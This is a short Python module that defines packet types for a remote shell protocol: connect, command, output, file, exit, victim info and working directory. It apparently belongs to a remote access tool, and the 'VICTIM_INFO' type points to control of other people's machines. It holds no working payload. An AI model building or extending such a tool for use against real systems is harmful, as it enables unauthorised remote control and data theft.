from enum import Enum

from src.modlues.protocols.protocol import Packet, PacketType


class RemoteShellPacketType(Enum):
    CONNECT = 0
    COMMAND = 1
    OUTPUT = 2
    FILE = 4
    EXIT = 5
    VICTIM_INFO = 6
    CWD = 7


class RemoteShellPacket(Packet):
    def __init__(self, packet_sub_type: RemoteShellPacketType, payload: bytes):
        super().__init__(PacketType.REMOTE_SHELL, packet_sub_type, payload)
